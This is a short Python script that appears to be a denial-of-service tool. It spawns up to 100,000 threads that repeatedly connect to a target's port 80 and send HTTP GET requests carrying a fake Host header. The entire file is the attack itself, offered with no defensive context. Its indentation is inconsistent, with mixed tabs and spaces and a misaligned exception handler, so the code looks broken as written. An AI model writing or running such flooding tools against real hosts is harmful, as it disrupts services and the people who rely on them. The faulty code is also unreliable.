import threading
import socket
import os
import time
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument('-ip', '--ip')
args = parser.parse_args()


target = args.ip
print(target)
port = 80
fake_ip = '10.10.10.10'


def attack():
	try:
	    while True:
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        s.connect((target, port))
	        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
	        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
	        s.close()
    except KeyboardInterrupt:
		sys.exit()
try:
	for j in range(100000):
   		thread = threading.Thread(target=attack)
   		thread.start()
except KeyboardInterrupt:
	sys.exit()
